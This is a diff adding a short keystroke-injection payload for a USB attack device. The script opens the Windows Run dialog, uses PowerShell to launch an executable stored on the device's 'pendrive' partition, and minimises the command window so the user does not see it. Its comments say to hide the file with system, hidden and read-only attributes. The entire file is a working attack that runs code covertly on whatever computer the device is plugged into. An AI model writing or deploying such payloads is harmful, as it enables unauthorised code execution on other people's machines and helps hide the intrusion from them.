@@ -1,0 +1,11 @@
+REM Payload that auto executs an .exe located at Visible MSD partition. 
+REM Use attrib +s +h +r to hide the .exe
+WAITFOR_INIT
+DELAY 500
+GUI r
+DELAY 300
+STRING cmd /c powershell start-process ((get-volume -filesystemlabel pendrive).driveletter+':\test.exe')
+DELAY 200
+REM Hide cmd process
+GUI DOWN
+
